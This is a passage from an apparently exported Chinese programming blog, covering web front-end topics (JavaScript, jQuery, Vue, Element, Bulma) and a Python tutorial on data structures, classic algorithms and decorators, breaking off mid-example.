浮动元素（float / clear） 网站布局 HTML5布局 适配屏幕尺寸 固定宽度布局 流体布局 布局网格 使用JavaScript控制行为JavaScript基本语法 语句和注释 变量和数据类型 声明和赋值 简单数据类型和复杂数据类型 变量的命名规则 表达式和运算符 赋值运算符 算术运算符 比较运算符 逻辑运算符 分支结构 if...else... switch...cas...default... 循环结构 for循环 while循环 do...while循环 数组 创建数组 操作数组中的元素 函数 声明函数 调用函数 参数和返回值 匿名函数 立即调用函数 面向对象 对象的概念 创建对象的字面量语法 访问成员运算符 创建对象的构造函数语法 this关键字 添加和删除属性 delete关键字 标准对象 Number / String / Boolean / Symbol / Array / Function Date / Error / Math / RegExp / Object / Map / Set JSON / Promise / Generator / Reflect / Proxy BOM window对象的属性和方法 history对象 forward() / back() / go() location对象 navigator对象 screen对象 DOM DOM树 访问元素 getElementById() / querySelector() getElementsByClassName() / getElementsByTagName() / querySelectorAll() parentNode / previousSibling / nextSibling / children / firstChild / lastChild 操作元素 nodeValue innerHTML / textContent / createElement() / createTextNode() / appendChild() / insertBefore() / removeChild() className / id / hasAttribute() / getAttribute() / setAttribute() / removeAttribute() 事件处理 事件类型 UI事件：load / unload / error / resize / scroll 键盘事件：keydown / keyup / keypress 鼠标事件：click / dbclick / mousedown / mouseup / mousemove / mouseover / mouseout 焦点事件：focus / blur 表单事件：input / change / submit / reset / cut / copy / paste / select 事件绑定 HTML事件处理程序（不推荐使用，因为要做到标签与代码分离） 传统的DOM事件处理程序（只能附加一个回调函数） 事件监听器（旧的浏览器中不被支持） 事件流：事件捕获 / 事件冒泡 事件对象（低版本IE中的window.event） target（有些浏览器使用srcElement） type cancelable preventDefault() stopPropagation()（低版本IE中的cancelBubble） 鼠标事件 - 事件发生的位置 屏幕位置：screenX和screenY 页面位置：pageX和pageY 客户端位置：clientX和clientY 键盘事件 - 哪个键被按下了 keyCode属性（有些浏览器使用which） String.fromCharCode(event.keyCode) HTML5事件 DOMContentLoaded hashchange beforeunload JavaScript API 客户端存储 - localStorage和sessionStorage localStorage.colorSetting = '#a4509b'; localStorage['colorSetting'] = '#a4509b'; localStorage.setItem('colorSetting', '#a4509b'); 获取位置信息 - geolocation navigator.geolocation.getCurrentPosition(function(pos) { console.log(pos.coords.latitude) console.log(pos.coords.longitude) }) 从服务器获取数据 - Fetch API 绘制图形 - &lt;canvas&gt;的API 音视频 - &lt;audio&gt;和&lt;video&gt;的API 使用jQueryjQuery概述 Write Less Do More（用更少的代码来完成更多的工作） 使用CSS选择器来查找元素（更简单更方便） 使用jQuery方法来操作元素（解决浏览器兼容性问题、应用于所有元素并施加多个方法） 引入jQuery 下载jQuery的开发版和压缩版 从CDN加载jQuery &lt;script src=\"https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js\"&gt;&lt;/script&gt; &lt;script&gt; window.jQuery || document.write('&lt;script src=\"js/jquery-3.3.1.min.js\"&gt;&lt;/script&gt;') &lt;/script&gt; 查找元素 选择器 * / element / #id / .class / selector1, selector2 ancestor descendant / parent&gt;child / previous+next / previous~siblings 筛选器 基本筛选器：:not(selector) / :first / :last / :even / :odd / :eq(index) / :gt(index) / :lt(index) / :animated / :focus 内容筛选器：:contains(‘…’) / :empty / :parent / :has(selector) 可见性筛选器：:hidden / :visible 子节点筛选器：:nth-child(expr) / :first-child / :last-child / :only-child 属性筛选器：[attribute] / [attribute=’value’] / [attribute!=’value’] / [attribute^=’value’] / [attribute$=’value’] / [attribute|=’value’] / [attribute~=’value’] 表单：:input / :text / :password / :radio / :checkbox / :submit / :image / :reset / :button / :file / :selected / :enabled / :disabled / :checked 执行操作 内容操作 获取/修改内容：html() / text() / replaceWith() / remove() 获取/设置元素：before() / after() / prepend() / append() / remove() / clone() / unwrap() / detach() / empty() / add() 获取/修改属性：attr() / removeAttr() / addClass() / removeClass() / css() 获取/设置表单值：val() 查找操作 查找方法：find() / parent() / children() / siblings() / next() / nextAll() / prev() / prevAll() 筛选器：filter() / not() / has() / is() / contains() 索引编号：eq() 尺寸和位置 尺寸相关：height() / width() / innerHeight() / innerWidth() / outerWidth() / outerHeight() 位置相关：offset() / position() / scrollLeft() / scrollTop() 特效和动画 基本动画：show() / hide() / toggle() 消失出现：fadeIn() / fadeOut() / fadeTo() / fadeToggle() 滑动效果：slideDown() / slideUp() / slideToggle() 自定义：delay() / stop() / animate() 事件 文档加载：ready() / load() 用户交互：on() / off() 链式操作检测页面是否可用&lt;script&gt; $(document).ready(function() { }); &lt;/script&gt; &lt;script&gt; $(function() { }); &lt;/script&gt; jQuery插件 jQuery Validation jQuery Treeview jQuery Autocomplete jQuery UI 避免和其他库的冲突先引入其他库再引入jQuery的情况。 &lt;script src=\"other.js\"&gt;&lt;/script&gt; &lt;script src=\"jquery.js\"&gt;&lt;/script&gt; &lt;script&gt; jQuery.noConflict(); jQuery(function() { jQuery('div').hide(); }); &lt;/script&gt; 先引入jQuery再引入其他库的情况。 &lt;script src=\"jquery.js\"&gt;&lt;/script&gt; &lt;script src=\"other.js\"&gt;&lt;/script&gt; &lt;script&gt; jQuery(function() { jQuery('div').hide(); }); &lt;/script&gt; 使用AjaxAjax是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术。 原生的Ajax 基于jQuery的Ajax 加载内容 提交表单 前端框架渐进式框架 - Vue.js前后端分离开发（前端渲染）必选框架。 快速上手 引入Vue的JavaScript文件，我们仍然推荐从CDN服务器加载它。 &lt;script src=\"https://cdn.jsdelivr.net/npm/vue\"&gt;&lt;/script&gt; 数据绑定（声明式渲染 ）。 &lt;div id=\"app\"&gt; &lt;h1&gt;{{ product }}库存信息&lt;/h1&gt; &lt;/div&gt; &lt;script src=\"https://cdn.jsdelivr.net/npm/vue\"&gt;&lt;/script&gt; &lt;script&gt; const app = new Vue({ el: '#app', data: { product: 'iPhone X' } }); &lt;/script&gt; 条件与循环。 &lt;div id=\"app\"&gt; &lt;h1&gt;库存信息&lt;/h1&gt; &lt;hr&gt; &lt;ul&gt; &lt;li v-for=\"product in products\"&gt; {{ product.name }} - {{ product.quantity }} &lt;span v-if=\"product.quantity === 0\"&gt; 已经售罄 &lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src=\"https://cdn.jsdelivr.net/npm/vue\"&gt;&lt;/script&gt; &lt;script&gt; const app = new Vue({ el: '#app', data: { products: [ {\"id\": 1, \"name\": \"iPhone X\", \"quantity\": 20}, {\"id\": 2, \"name\": \"华为 Mate20\", \"quantity\": 0}, {\"id\": 3, \"name\": \"小米 Mix3\", \"quantity\": 50} ] } }); &lt;/script&gt; 计算属性。 &lt;div id=\"app\"&gt; &lt;h1&gt;库存信息&lt;/h1&gt; &lt;hr&gt; &lt;ul&gt; &lt;li v-for=\"product in products\"&gt; {{ product.name }} - {{ product.quantity }} &lt;span v-if=\"product.quantity === 0\"&gt; 已经售罄 &lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;h2&gt;库存总量：{{ totalQuantity }}台&lt;/h2&gt; &lt;/div&gt; &lt;script src=\"https://cdn.jsdelivr.net/npm/vue\"&gt;&lt;/script&gt; &lt;script&gt; const app = new Vue({ el: '#app', data: { products: [ {\"id\": 1, \"name\": \"iPhone X\", \"quantity\": 20}, {\"id\": 2, \"name\": \"华为 Mate20\", \"quantity\": 0}, {\"id\": 3, \"name\": \"小米 Mix3\", \"quantity\": 50} ] }, computed: { totalQuantity() { return this.products.reduce((sum, product) =&gt; { return sum + product.quantity }, 0); } } }); &lt;/script&gt; 处理事件。 &lt;div id=\"app\"&gt; &lt;h1&gt;库存信息&lt;/h1&gt; &lt;hr&gt; &lt;ul&gt; &lt;li v-for=\"product in products\"&gt; {{ product.name }} - {{ product.quantity }} &lt;span v-if=\"product.quantity === 0\"&gt; 已经售罄 &lt;/span&gt; &lt;button @click=\"product.quantity += 1\"&gt; 增加库存 &lt;/button&gt; &lt;/li&gt; &lt;/ul&gt; &lt;h2&gt;库存总量：{{ totalQuantity }}台&lt;/h2&gt; &lt;/div&gt; &lt;script src=\"https://cdn.jsdelivr.net/npm/vue\"&gt;&lt;/script&gt; &lt;script&gt; const app = new Vue({ el: '#app', data: { products: [ {\"id\": 1, \"name\": \"iPhone X\", \"quantity\": 20}, {\"id\": 2, \"name\": \"华为 Mate20\", \"quantity\": 0}, {\"id\": 3, \"name\": \"小米 Mix3\", \"quantity\": 50} ] }, computed: { totalQuantity() { return this.products.reduce((sum, product) =&gt; { return sum + product.quantity }, 0); } } }); &lt;/script&gt; 用户输入。 &lt;div id=\"app\"&gt; &lt;h1&gt;库存信息&lt;/h1&gt; &lt;hr&gt; &lt;ul&gt; &lt;li v-for=\"product in products\"&gt; {{ product.name }} - &lt;input type=\"number\" v-model.number=\"product.quantity\" min=\"0\"&gt; &lt;span v-if=\"product.quantity === 0\"&gt; 已经售罄 &lt;/span&gt; &lt;button @click=\"product.quantity += 1\"&gt; 增加库存 &lt;/button&gt; &lt;/li&gt; &lt;/ul&gt; &lt;h2&gt;库存总量：{{ totalQuantity }}台&lt;/h2&gt; &lt;/div&gt; &lt;script src=\"https://cdn.jsdelivr.net/npm/vue\"&gt;&lt;/script&gt; &lt;script&gt; const app = new Vue({ el: '#app', data: { products: [ {\"id\": 1, \"name\": \"iPhone X\", \"quantity\": 20}, {\"id\": 2, \"name\": \"华为 Mate20\", \"quantity\": 0}, {\"id\": 3, \"name\": \"小米 Mix3\", \"quantity\": 50} ] }, computed: { totalQuantity() { return this.products.reduce((sum, product) =&gt; { return sum + product.quantity }, 0); } } }); &lt;/script&gt; 通过网络加载JSON数据。 &lt;div id=\"app\"&gt; &lt;h2&gt;库存信息&lt;/h2&gt; &lt;ul&gt; &lt;li v-for=\"product in products\"&gt; {{ product.name }} - {{ product.quantity }} &lt;span v-if=\"product.quantity === 0\"&gt; 已经售罄 &lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src=\"https://cdn.jsdelivr.net/npm/vue\"&gt;&lt;/script&gt; &lt;script&gt; const app = new Vue({ el: '#app', data: { products: [] }， created() { fetch('https://jackfrued.top/api/products') .then(response =&gt; response.json()) .then(json =&gt; { this.products = json }); } }); &lt;/script&gt; 使用脚手架 - vue-cliVue为商业项目开发提供了非常便捷的脚手架工具vue-cli，通过工具可以省去手工配置开发环境、测试环境和运行环境的步骤，让开发者只需要关注要解决的问题。 安装脚手架。 创建项目。 安装依赖包。 运行项目。 UI框架 - Element基于Vue 2.0的桌面端组件库，用于构造用户界面，支持响应式布局。 引入Element的CSS和JavaScript文件。 &lt;!-- 引入样式 --&gt; &lt;link rel=\"stylesheet\" href=\"https://unpkg.com/element-ui/lib/theme-chalk/index.css\"&gt; &lt;!-- 引入组件库 --&gt; &lt;script src=\"https://unpkg.com/element-ui/lib/index.js\"&gt;&lt;/script&gt; 一个简单的例子。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;link rel=\"stylesheet\" href=\"https://unpkg.com/element-ui/lib/theme-chalk/index.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"app\"&gt; &lt;el-button @click=\"visible = true\"&gt;点我&lt;/el-button&gt; &lt;el-dialog :visible.sync=\"visible\" title=\"Hello world\"&gt; &lt;p&gt;开始使用Element吧&lt;/p&gt; &lt;/el-dialog&gt; &lt;/div&gt; &lt;/body&gt; &lt;script src=\"https://unpkg.com/vue/dist/vue.js\"&gt;&lt;/script&gt; &lt;script src=\"https://unpkg.com/element-ui/lib/index.js\"&gt;&lt;/script&gt; &lt;script&gt; new Vue({ el: '#app', data: { visible: false, } }) &lt;/script&gt; &lt;/html&gt; 使用组件。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;link rel=\"stylesheet\" href=\"https://unpkg.com/element-ui/lib/theme-chalk/index.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"app\"&gt; &lt;el-table :data=\"tableData\" stripe style=\"width: 100%\"&gt; &lt;el-table-column prop=\"date\" label=\"日期\" width=\"180\"&gt; &lt;/el-table-column&gt; &lt;el-table-column prop=\"name\" label=\"姓名\" width=\"180\"&gt; &lt;/el-table-column&gt; &lt;el-table-column prop=\"address\" label=\"地址\"&gt; &lt;/el-table-column&gt; &lt;/el-table&gt; &lt;/div&gt; &lt;/body&gt; &lt;script src=\"https://unpkg.com/vue/dist/vue.js\"&gt;&lt;/script&gt; &lt;script src=\"https://unpkg.com/element-ui/lib/index.js\"&gt;&lt;/script&gt; &lt;script&gt; new Vue({ el: '#app', data: { tableData: [ { date: '2016-05-02', name: '王一霸', address: '上海市普陀区金沙江路 1518 弄' }, { date: '2016-05-04', name: '刘二狗', address: '上海市普陀区金沙江路 1517 弄' }, { date: '2016-05-01', name: '杨三萌', address: '上海市普陀区金沙江路 1519 弄' }, { date: '2016-05-03', name: '陈四吹', address: '上海市普陀区金沙江路 1516 弄' } ] } }) &lt;/script&gt; &lt;/html&gt; 报表框架 - ECharts百度出品的开源可视化库，常用于生成各种类型的报表。 基于弹性盒子的CSS框架 - BulmaBulma是一个基于Flexbox的现代化的CSS框架，其初衷就是移动优先（Mobile First），模块化设计，可以轻松用来实现各种简单或者复杂的内容布局，即使不懂CSS的开发者也能够使用它定制出漂亮的页面。 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Bulma&lt;/title&gt; &lt;link href=\"https://cdn.bootcss.com/bulma/0.7.4/css/bulma.min.css\" rel=\"stylesheet\"&gt; &lt;style type=\"text/css\"&gt; div { margin-top: 10px; } .column { color: #fff; background-color: #063; margin: 10px 10px; text-align: center; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"columns\"&gt; &lt;div class=\"column\"&gt;1&lt;/div&gt; &lt;div class=\"column\"&gt;2&lt;/div&gt; &lt;div class=\"column\"&gt;3&lt;/div&gt; &lt;div class=\"column\"&gt;4&lt;/div&gt; &lt;/div&gt; &lt;div&gt; &lt;a class=\"button is-primary\"&gt;Primary&lt;/a&gt; &lt;a class=\"button is-link\"&gt;Link&lt;/a&gt; &lt;a class=\"button is-info\"&gt;Info&lt;/a&gt; &lt;a class=\"button is-success\"&gt;Success&lt;/a&gt; &lt;a class=\"button is-warning\"&gt;Warning&lt;/a&gt; &lt;a class=\"button is-danger\"&gt;Danger&lt;/a&gt; &lt;/div&gt; &lt;div&gt; &lt;progress class=\"progress is-danger is-medium\" max=\"100\"&gt;60%&lt;/progress&gt; &lt;/div&gt; &lt;div&gt; &lt;table class=\"table is-hoverable\"&gt; &lt;tr&gt; &lt;th&gt;One&lt;/th&gt; &lt;th&gt;Two&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Three&lt;/td&gt; &lt;td&gt;Four&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Five&lt;/td&gt; &lt;td&gt;Six&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Seven&lt;/td&gt; &lt;td&gt;Eight&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Nine&lt;/td&gt; &lt;td&gt;Ten&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Eleven&lt;/td&gt; &lt;td&gt;Twelve&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 响应式布局框架 - Bootstrap用于快速开发Web应用程序的前端框架，支持响应式布局。 特点 支持主流的浏览器和移动设备 容易上手 响应式设计 内容 网格系统 封装的CSS 现成的组件 JavaScript插件 可视化","categories":[],"tags":[{"name":"web前端","slug":"web前端","permalink":"http://www.xiaocaibi.top/tags/web%E5%89%8D%E7%AB%AF/"}]},{"title":"16-20.python语言进阶","slug":"16-20-python语言进阶","date":"2021-05-19T13:40:30.000Z","updated":"2021-09-20T08:47:43.948Z","comments":true,"path":"posts/1c2e6fef.html","link":"","permalink":"http://www.xiaocaibi.top/posts/1c2e6fef.html","excerpt":"","text":"Python语言进阶重要知识点 生成式（推导式）的用法 prices = { 'AAPL': 191.88, 'GOOG': 1186.96, 'IBM': 149.24, 'ORCL': 48.44, 'ACN': 166.89, 'FB': 208.09, 'SYMC': 21.29 } # 用股票价格大于100元的股票构造一个新的字典 prices2 = {key: value for key, value in prices.items() if value &gt; 100} print(prices2) 说明：生成式（推导式）可以用来生成列表、集合和字典。 嵌套的列表的坑 names = ['关羽', '张飞', '赵云', '马超', '黄忠'] courses = ['语文', '数学', '英语'] # 录入五个学生三门课程的成绩 # 错误 - 参考http://pythontutor.com/visualize.html#mode=edit # scores = [[None] * len(courses)] * len(names) scores = [[None] * len(courses) for _ in range(len(names))] for row, name in enumerate(names): for col, course in enumerate(courses): scores[row][col] = float(input(f'请输入{name}的{course}成绩: ')) print(scores) Python Tutor - VISUALIZE CODE AND GET LIVE HELP heapq模块（堆排序） \"\"\" 从列表中找出最大的或最小的N个元素 堆结构(大根堆/小根堆) \"\"\" import heapq list1 = [34, 25, 12, 99, 87, 63, 58, 78, 88, 92] list2 = [ {'name': 'IBM', 'shares': 100, 'price': 91.1}, {'name': 'AAPL', 'shares': 50, 'price': 543.22}, {'name': 'FB', 'shares': 200, 'price': 21.09}, {'name': 'HPQ', 'shares': 35, 'price': 31.75}, {'name': 'YHOO', 'shares': 45, 'price': 16.35}, {'name': 'ACME', 'shares': 75, 'price': 115.65} ] print(heapq.nlargest(3, list1)) print(heapq.nsmallest(3, list1)) print(heapq.nlargest(2, list2, key=lambda x: x['price'])) print(heapq.nlargest(2, list2, key=lambda x: x['shares'])) itertools模块 \"\"\" 迭代工具模块 \"\"\" import itertools # 产生ABCD的全排列 itertools.permutations('ABCD') # 产生ABCDE的五选三组合 itertools.combinations('ABCDE', 3) # 产生ABCD和123的笛卡尔积 itertools.product('ABCD', '123') # 产生ABC的无限循环序列 itertools.cycle(('A', 'B', 'C')) collections模块 常用的工具类： namedtuple：命令元组，它是一个类工厂，接受类型的名称和属性列表来创建一个类。 deque：双端队列，是列表的替代实现。Python中的列表底层是基于数组来实现的，而deque底层是双向链表，因此当你需要在头尾添加和删除元素是，deque会表现出更好的性能，渐近时间复杂度为$O(1)$。 Counter：dict的子类，键是元素，值是元素的计数，它的most_common()方法可以帮助我们获取出现频率最高的元素。Counter和dict的继承关系我认为是值得商榷的，按照CARP原则，Counter跟dict的关系应该设计为关联关系更为合理。 OrderedDict：dict的子类，它记录了键值对插入的顺序，看起来既有字典的行为，也有链表的行为。 defaultdict：类似于字典类型，但是可以通过默认的工厂函数来获得键对应的默认值，相比字典中的setdefault()方法，这种做法更加高效。 \"\"\" 找出序列中出现次数最多的元素 \"\"\" from collections import Counter words = [ 'look', 'into', 'my', 'eyes', 'look', 'into', 'my', 'eyes', 'the', 'eyes', 'the', 'eyes', 'the', 'eyes', 'not', 'around', 'the', 'eyes', \"don't\", 'look', 'around', 'the', 'eyes', 'look', 'into', 'my', 'eyes', \"you're\", 'under' ] counter = Counter(words) print(counter.most_common(3)) 数据结构和算法 算法：解决问题的方法和步骤 评价算法的好坏：渐近时间复杂度和渐近空间复杂度。 渐近时间复杂度的大O标记： - 常量时间复杂度 - 布隆过滤器 / 哈希存储 - 对数时间复杂度 - 折半查找（二分查找） - 线性时间复杂度 - 顺序查找 / 计数排序 - 对数线性时间复杂度 - 高级排序算法（归并排序、快速排序） - 平方时间复杂度 - 简单排序算法（选择排序、插入排序、冒泡排序） - 立方时间复杂度 - Floyd算法 / 矩阵乘法运算 - 几何级数时间复杂度 - 汉诺塔 - 阶乘时间复杂度 - 旅行经销商问题 - NPC 排序算法（选择、冒泡和归并）和查找算法（顺序和折半） def select_sort(items, comp=lambda x, y: x &lt; y): \"\"\"简单选择排序\"\"\" items = items[:] for i in range(len(items) - 1): min_index = i for j in range(i + 1, len(items)): if comp(items[j], items[min_index]): min_index = j items[i], items[min_index] = items[min_index], items[i] return items def bubble_sort(items, comp=lambda x, y: x &gt; y): \"\"\"冒泡排序\"\"\" items = items[:] for i in range(len(items) - 1): swapped = False for j in range(len(items) - 1 - i): if comp(items[j], items[j + 1]): items[j], items[j + 1] = items[j + 1], items[j] swapped = True if not swapped: break return items def bubble_sort(items, comp=lambda x, y: x &gt; y): \"\"\"搅拌排序(冒泡排序升级版)\"\"\" items = items[:] for i in range(len(items) - 1): swapped = False for j in range(len(items) - 1 - i): if comp(items[j], items[j + 1]): items[j], items[j + 1] = items[j + 1], items[j] swapped = True if swapped: swapped = False for j in range(len(items) - 2 - i, i, -1): if comp(items[j - 1], items[j]): items[j], items[j - 1] = items[j - 1], items[j] swapped = True if not swapped: break return items def merge(items1, items2, comp=lambda x, y: x &lt; y): \"\"\"合并(将两个有序的列表合并成一个有序的列表)\"\"\" items = [] index1, index2 = 0, 0 while index1 &lt; len(items1) and index2 &lt; len(items2): if comp(items1[index1], items2[index2]): items.append(items1[index1]) index1 += 1 else: items.append(items2[index2]) index2 += 1 items += items1[index1:] items += items2[index2:] return items def merge_sort(items, comp=lambda x, y: x &lt; y): return _merge_sort(list(items), comp) def _merge_sort(items, comp): \"\"\"归并排序\"\"\" if len(items) &lt; 2: return items mid = len(items) // 2 left = _merge_sort(items[:mid], comp) right = _merge_sort(items[mid:], comp) return merge(left, right, comp) def seq_search(items, key): \"\"\"顺序查找\"\"\" for index, item in enumerate(items): if item == key: return index return -1 def bin_search(items, key): \"\"\"折半查找\"\"\" start, end = 0, len(items) - 1 while start &lt;= end: mid = (start + end) // 2 if key &gt; items[mid]: start = mid + 1 elif key &lt; items[mid]: end = mid - 1 else: return mid return -1 常用算法： 穷举法 - 又称为暴力破解法，对所有的可能性进行验证，直到找到正确答案。 贪婪法 - 在对问题求解时，总是做出在当前看来 最好的选择，不追求最优解，快速找到满意解。 分治法 - 把一个复杂的问题分成两个或更多的相同或相似的子问题，再把子问题分成更小的子问题，直到可以直接求解的程度，最后将子问题的解进行合并得到原问题的解。 回溯法 - 回溯法又称为试探法，按选优条件向前搜索，当搜索到某一步发现原先选择并不优或达不到目标时，就退回一步重新选择。 动态规划 - 基本思想也是将待求解问题分解成若干个子问题，先求解并保存这些子问题的解，避免产生大量的重复运算。 穷举法例子：百钱百鸡和五人分鱼。 # 公鸡5元一只 母鸡3元一只 小鸡1元三只 # 用100元买100只鸡 问公鸡/母鸡/小鸡各多少只 for x in range(20): for y in range(33): z = 100 - x - y if 5 * x + 3 * y + z // 3 == 100 and z % 3 == 0: print(x, y, z) # A、B、C、D、E五人在某天夜里合伙捕鱼 最后疲惫不堪各自睡觉 # 第二天A第一个醒来 他将鱼分为5份 扔掉多余的1条 拿走自己的一份 # B第二个醒来 也将鱼分为5份 扔掉多余的1条 拿走自己的一份 # 然后C、D、E依次醒来也按同样的方式分鱼 问他们至少捕了多少条鱼 fish = 6 while True: total = fish enough = True for _ in range(5): if (total - 1) % 5 == 0: total = (total - 1) // 5 * 4 else: enough = False break if enough: print(fish) break fish += 5 贪婪法例子：假设小偷有一个背包，最多能装20公斤赃物，他闯入一户人家，发现如下表所示的物品。很显然，他不能把所有物品都装进背包，所以必须确定拿走哪些物品，留下哪些物品。 名称 价格（美元） 重量（kg） 电脑 200 20 收音机 20 4 钟 175 10 花瓶 50 2 书 10 1 油画 90 9 \"\"\" 贪婪法：在对问题求解时，总是做出在当前看来是最好的选择，不追求最优解，快速找到满意解。 输入： 20 6 电脑 200 20 收音机 20 4 钟 175 10 花瓶 50 2 书 10 1 油画 90 9 \"\"\" class Thing(object): \"\"\"物品\"\"\" def __init__(self, name, price, weight): self.name = name self.price = price self.weight = weight @property def value(self): \"\"\"价格重量比\"\"\" return self.price / self.weight def input_thing(): \"\"\"输入物品信息\"\"\" name_str, price_str, weight_str = input().split() return name_str, int(price_str), int(weight_str) def main(): \"\"\"主函数\"\"\" max_weight, num_of_things = map(int, input().split()) all_things = [] for _ in range(num_of_things): all_things.append(Thing(*input_thing())) all_things.sort(key=lambda x: x.value, reverse=True) total_weight = 0 total_price = 0 for thing in all_things: if total_weight + thing.weight &lt;= max_weight: print(f'小偷拿走了{thing.name}') total_weight += thing.weight total_price += thing.price print(f'总价值: {total_price}美元') if __name__ == '__main__': main() 分治法例子：快速排序。 \"\"\" 快速排序 - 选择枢轴对元素进行划分，左边都比枢轴小右边都比枢轴大 \"\"\" def quick_sort(items, comp=lambda x, y: x &lt;= y): items = list(items)[:] _quick_sort(items, 0, len(items) - 1, comp) return items def _quick_sort(items, start, end, comp): if start &lt; end: pos = _partition(items, start, end, comp) _quick_sort(items, start, pos - 1, comp) _quick_sort(items, pos + 1, end, comp) def _partition(items, start, end, comp): pivot = items[end] i = start - 1 for j in range(start, end): if comp(items[j], pivot): i += 1 items[i], items[j] = items[j], items[i] items[i + 1], items[end] = items[end], items[i + 1] return i + 1 回溯法例子：骑士巡逻。 \"\"\" 递归回溯法：叫称为试探法，按选优条件向前搜索，当搜索到某一步，发现原先选择并不优或达不到目标时，就退回一步重新选择，比较经典的问题包括骑士巡逻、八皇后和迷宫寻路等。 \"\"\" import sys import time SIZE = 5 total = 0 def print_board(board): for row in board: for col in row: print(str(col).center(4), end='') print() def patrol(board, row, col, step=1): if row &gt;= 0 and row &lt; SIZE and \\ col &gt;= 0 and col &lt; SIZE and \\ board[row][col] == 0: board[row][col] = step if step == SIZE * SIZE: global total total += 1 print(f'第{total}种走法: ') print_board(board) patrol(board, row - 2, col - 1, step + 1) patrol(board, row - 1, col - 2, step + 1) patrol(board, row + 1, col - 2, step + 1) patrol(board, row + 2, col - 1, step + 1) patrol(board, row + 2, col + 1, step + 1) patrol(board, row + 1, col + 2, step + 1) patrol(board, row - 1, col + 2, step + 1) patrol(board, row - 2, col + 1, step + 1) board[row][col] = 0 def main(): board = [[0] * SIZE for _ in range(SIZE)] patrol(board, SIZE - 1, SIZE - 1) if __name__ == '__main__': main() 动态规划例子：子列表元素之和的最大值。 说明：子列表指的是列表中索引（下标）连续的元素构成的列表；列表中的元素是int类型，可能包含正整数、0、负整数；程序输入列表中的元素，输出子列表元素求和的最大值，例如： 输入：1 -2 3 5 -3 2 输出：8 输入：0 -2 3 5 -1 2 输出：9 输入：-9 -2 -3 -5 -3 输出：-2 def main(): items = list(map(int, input().split())) overall = partial = items[0] for i in range(1, len(items)): partial = max(items[i], partial + items[i]) overall = max(partial, overall) print(overall) if __name__ == '__main__': main() 说明：这个题目最容易想到的解法是使用二重循环，但是代码的时间性能将会变得非常的糟糕。使用动态规划的思想，仅仅是多用了两个变量，就将原来$O(N^2)$复杂度的问题变成了$O(N)$。 函数的使用方式 将函数视为“一等公民” 函数可以赋值给变量 函数可以作为函数的参数 函数可以作为函数的返回值 高阶函数的用法（filter、map以及它们的替代品） items1 = list(map(lambda x: x ** 2, filter(lambda x: x % 2, range(1, 10)))) items2 = [x ** 2 for x in range(1, 10) if x % 2] 位置参数、可变参数、关键字参数、命名关键字参数 参数的元信息（代码可读性问题） 匿名函数和内联函数的用法（lambda函数） 闭包和作用域问题 Python搜索变量的LEGB顺序（Local &gt;&gt;&gt; Embedded &gt;&gt;&gt; Global &gt;&gt;&gt; Built-in） global和nonlocal关键字的作用 global：声明或定义全局变量（要么直接使用现有的全局作用域的变量，要么定义一个变量放到全局作用域）。 nonlocal：声明使用嵌套作用域的变量（嵌套作用域必须存在该变量，否则报错）。 装饰器函数（使用装饰器和取消装饰器） 例子：输出函数执行时间的装饰器。 def record_time(func): \"\"\"自定义装饰函数的装饰器\"\"\" @wraps(func) def wrapper(*args, **kwargs): start = time() result = func(*args, **kwargs) print(f'{func.__name__}: {time() - start}秒') return result return wrapper 如果装饰器不希望跟print函数耦合，可以编写可以参数化的装饰器。 from functools import wraps from time import time def record(output): \"\"\"可以参数化的装饰器\"\"\" def decorate(func): @wraps(func) def wrapper(*args, **kwargs): start = time() result = func(*args, **kwargs) output(func.__name__, time() - start) return result return wrapper return decorate from functools import wraps from time import time class Record(): \"\"\"通过定义类的方式定义装饰器\"\"\" def __init__(self, output): self.output = output def __call__(self, func): @wraps(func) def wrapper(*args, **kwargs): start = time() result = func(*args, **kwargs) self.output(func.__name__, time() - start) return result return wrapper 说明：由于对带装饰功能的函数添加了@wraps装饰器，可以通过func.__wrapped__方式获得被装饰之前的函数或类来取消装饰器的作用。 例子：用装饰器来实现单例模式。 from functools import wraps def singleton(cls): \"\"\"装饰类的装饰器\"\"\" instances = {} @wraps(cls) def wrapper(*args, **kwargs): if cls not in instances: instances[cls] = cls(*args, **kwargs) return instances[cls] return wrapper @singleton class President: \"\"\"总统(单例类)\"\"\" pass 提示：上面的代码中用到了闭包（closure），不知道你是否已经意识到了。还没有一个小问题就是，上面的代码并没有实现线程安全的单例，如果要实现线程安全的单例应该怎么做呢？ 线程安全的单例装饰器。 from functools import wraps from threading import RLock def singleton(cls): \"\"\"线程安全的单例装饰器\"\"\" instances = {} locker = RLock() @wraps(cls) def wrapper(*args, **kwargs): if cls not in instances: with locker: if cls not in instances: instances[cls] = cls(*args, **kwargs) return instances[cls] return wrapper 提示：上面的代码用到了with上下文语法来进行锁操作，因为锁对象本身就是上下文管理器对象（支持__enter__和__exit__魔术方法）。在wrapper函数中，我们先做了一次不带锁的检查，然后再做带锁的检查，这样做比直接加锁检查性能要更好，如果对象已经创建就没有必须再去加锁而是直接返回该对象就可以了。 面向对象相关知识 三大支柱：封装、继承、多态 例子：工资结算系统。 \"\"\" 月薪结算系统 - 部门经理每月15000 程序员每小时200 销售员1800底薪加销售额5%提成 \"\"\" from abc import ABCMeta, abstractmethod class Employee(metaclass=ABCMeta): \"\"\"员工(抽象类)\"\"\" def 